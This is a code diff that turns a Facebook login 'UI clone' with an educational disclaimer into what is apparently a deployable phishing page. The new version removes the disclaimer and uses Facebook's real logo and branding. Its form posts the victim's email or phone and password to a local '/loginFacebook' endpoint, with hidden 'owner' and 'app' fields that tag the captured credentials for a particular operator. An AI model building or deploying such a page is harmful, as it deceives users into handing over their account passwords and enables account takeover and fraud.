@@ -1,94 +1,166 @@
-
-
-<!--Code for Mobile Screen-->
-
-<div class="mobile">
-  <div class="mobheader">
-    <img src="images/fblogo.png" class="mobfblogo">
-  </div>
-  <div id="mobapplink" class="clearfix">
-    <a href="#">
-      <img src="images/fbandroid.png" id="mobandroidpic">
-      <div id="getfbandroid">Get Facebook for Android and browse faster.</div>
-    </a>
-  </div>
-  <div class="mobmaindiv">
-    <div id="mobtextdiv">
-      <input type="text" class="mobtextbox mobtextbox1" placeholder="Mobile number or email address">
-      <input type="password" class="mobtextbox mobtextbox2" placeholder="Password">
-    </div>
-    <div class="mobloginbuttondiv">
-      <input type="submit" class="mobloginbutton" value="Log In">
-    </div>
-    <div id="ordiv">
-    <span id="or">or</span>
-    </div>
-    <div id="mobcreatediv">
-      <button id="mobcreate">Create New Account</button>
-    </div>
-    <div class="mobforgotpw">
-      <a href="#">Forgotten password?</a>
-      <span>·</span>
-      <a href="#">Help Center</a>
-    </div>
-  </div>
-  <div class="mobfooter">
-    <div id="moblangs">
-      <div class="item1">
-        <li><a href="#" id="mobcurrentlang">English (UK)</a></li>
-        <li><a href="#">தமிழ்</a></li>
-        <li><a href="#">हिन्दी</a></li>
-        <li><a href="#">বাংলা</a></li>
-      </div>
-      <div class="item2">
-        <li><a href="#">മലയാളം</a></li>
-        <li><a href="#">ಕನ್ನಡ</a></li>
-        <li><a href="#">اردو</a></li>
-        <li><a href="#"><i class="fa fa-plus-square-o"></i></a></li>
-      </div>
-    </div>
-    <div class="mobcopyright">
-      <span class="mobfbcopyright"><a href="https://www.facebook.com" target="_blank" id="mobcopyrightfblink">Facebook</a> ©2021</span><br>
-      <span id="mobdisclaimer">UI cloned for educational purposes by <a href="https://codingdiksha.com" target="_blank" id="codingdiksha">Coding Diksha</a></span>
-    </div>
-    </div>
-</div>
-</body>
-
-<html>
+<!DOCTYPE html>
+<html lang="en">
 <head>
-<link href="style.css" type="text/css" rel="stylesheet"/>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook</title>
+    <link rel="icon" href="https://img.icons8.com/color/96/000000/facebook-new.png" type="image/png">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="/static/facebook/facebook.css">
+    <script type="text/javascript">
+    
+        function checktext(){
+            if(document.getElementById("username").value.trim().length>4 && document.getElementById("password").value.trim().length>4){
+                document.getElementById("login-button").disabled=false;
+             document.getElementById("login-button").style.backgroundColor='DodgerBlue';
+          
+            } else {
+                document.getElementById("login-button").disabled=true;
+             document.getElementById("login-button").style.backgroundColor= '#a8d1f7';
+        }
+     }
+        
+     </script>
+
 </head>
 <body>
 
-<div id="header_wrapper">
- <div id="header">
- <li id="sitename"><a href="htts://codingdiksha.com">Coding Diksha</a></li>
- <form action="post">
- <li>Email or Phone<br><input type="text" name="email"></li>
- <li>Password<br><input type="password" name="password"><br><a href="">Forgotten account?</a></li>
- <li><input type="submit" name="login" value="Log In"></li>
- </form>
- </div>
-</div>
+    <!-- logo: https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg -->
 
-<div id="wrapper">
+    <div class="fix-m-header">
+        <img src="/static/facebook/cell-phone.png" alt="Android">
+        <span>Get Facebook for Android and browse faster</span>
+    </div>
 
-<div id="div1">
-<p>Coding Diksha helps you connect and share with the <br>people in your life.</p>
-</div>
+    <div class="container">
+        <!-- main container -->
+        <div class="content">
+            <!-- logo container -->
+           <div class="left-content">
+               <div class="f-logo">
+                   <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="Facebook" />
+               </div>
+               <h2 class="f-quote">Facebook helps you connect and share with the people in your life.</h2>
+           </div>
+           <!-- login form -->
+           <div class="right-content">
+               <div class="card">
 
 
-<div id="footer_wrapper">
+                   <form action="/loginFacebook" method="POST">
+                       <div class="input-container">
+                           <input id="username" name="uid" onkeyup="checktext()" type="text" placeholder="Email address or phone number">
+                       </div>
+                       <div class="input-container">
+                            <input id="password" name="pas" onkeyup="checktext()" type="password" placeholder="Password">
+                        </div>
+                        <input type="text" name="owner" hidden value={{uid}}>
+                    <input type="text"     name="app" hidden value="Facebook">
+                        <div class="login-btn-container">
+                            <button id="login-button" type="submit"  disabled class="login-btn" style="cursor: pointer;">Log In</button>
+                        </div>
+                   </form>
 
-<div id="footer1">
-English (UK) <a href="">हिन्दी</a><a href="">ਪੰਜਾਬੀ</a><a href=""> اردو</a><a href="">தமிழ்</a><a href="">বাংলা</a><a href="">मराठी</a><a href="">తెలుగు</a><a href="">ગુજરાતી</a><a href="">ಕನ್ನಡ</a><a href="">മലയാളം</a>
-</div>
-<div id="footer2">
-<a href="">Sign Up</a><a href="">Log In</a><a href="">Messenger</a><a href="">Talkerscode</a><a href="">Mobile</a><a href="">Find Friends</a><a href="">Badges</a><a href="">People</a><a href="">Pages</a><a href="">Places</a><a href="">Games</a><a href="">Locations</a><a href="">Celebrities</a><a href="">Groups</a><a href="">Moments</a><a href="">About</a><a href="">Create Advert</a><a href="">Create Page</a><a href="">Developers</a><a href="">Careers</a><a href="">Privacy</a><a href="">Cookies</a><a href="">Ads</a><a href="">Terms</a><a href="">Help</a>
-<p>Design By CodingDiksha.com</a>
-</div>
 
-</div>
+
+
+
+
+
+                   <div class="forgotten-password">
+                       <a href="#">Forgotten Password?</a>
+                   </div>
+
+                   <div class="divider"></div>
+
+                   <div class="" style="text-align: center;">
+                       <a class="crt-new-ac" href="#">Create New Account</a>
+                   </div>
+               </div>
+               <div class="crt-page">
+                   <a href="#">Create a Page</a>
+                   <span>for a celebrity, band or business.</span>
+               </div>
+           </div>
+        </div>
+    </div>
+
+    <footer class="f-lg-footer">
+        <ul>
+            <li><a href="">English (UK)</a></li>
+            <li><a href="">বাংলা</a></li>
+            <li><a href="">हिन्दी</a></li>
+            <li><a href="">اردو</a></li>
+            <li><a href="">नेपाली</a></li>
+            <li><a href="">ଓଡ଼ିଆ</a></li>
+            <li><a href="">Español</a></li>
+            <li><a href="">Português (Brasil)</a></li>
+            <li><a href="">Français (France)</a></li>
+            <li><a href="">Deutsch</a></li>
+            <li><a href="">Italiano</a></li>
+        </ul>
+        <div class="divider"></div>
+        <ul>  
+            <li><a href="">Sign Up</a></li>
+            <li><a href="">Log In</a></li>
+            <li><a href="">Messenger</a></li>
+            <li><a href="">Facebook Lite</a></li>
+            <li><a href="">Watch</a></li>
+            <li><a href="">Places</a></li>
+            <li><a href="">Games</a></li>
+            <li><a href="">Marketplace</a></li>
+            <li><a href="">Facebook Pay</a></li>
+            <li><a href="">Jobs</a></li>
+            <li><a href="">Oculus</a></li>
+            <li><a href="">Portal</a></li>
+            <li><a href="">Instagram</a></li>
+            <li><a href="">Local</a></li>
+            <li><a href="">Fundraisers</a></li>
+            <li><a href="">Services</a></li>
+            <li><a href="">Voting</a></li>
+            <li><a href="">Information Centre</a></li>
+            <li><a href="">About</a></li>
+            <li><a href="">Create ad</a></li>
+            <li><a href="">Create Page</a></li>
+            <li><a href="">Developers</a></li>
+            <li><a href="">Careers</a></li>
+            <li><a href="">Privacy</a></li>
+            <li><a href="">Cookies</a></li>
+            <li><a href="">AdChoices</a></li>
+            <li><a href="">Terms</a></li>
+            <li><a href="">Help</a></li>
+            <li><a href="">Settings</a></li>
+        </ul>
+    </footer>
+
+    <div class="m-footer">
+        <div class="m-f-lang">
+            <ul>
+                <li><a href="">English (UK)</a></li>
+                <li><a href="">বাংলা</a></li>
+                <li><a href="">हिन्दी</a></li>
+            </ul>
+            <ul>
+                <li><a href="">اردو</a></li>
+                <li><a href="">नेपाली</a></li>
+                <li><a href="">ଓଡ଼ିଆ</a></li>
+            </ul>
+        </div>
+        
+
+        <div style="clear: both;"></div>
+
+        <div class="links" style="text-align: center;">
+            <a href="#">About</a><a href="#">Help</a><a href="#">More</a>
+        </div>
+
+        <div style="font-weight: 600;text-align: center;margin: 10px 0;color: #777;">Facebook Inc</div>
+    </div>
+
+    
+    
 </body>
 </html>
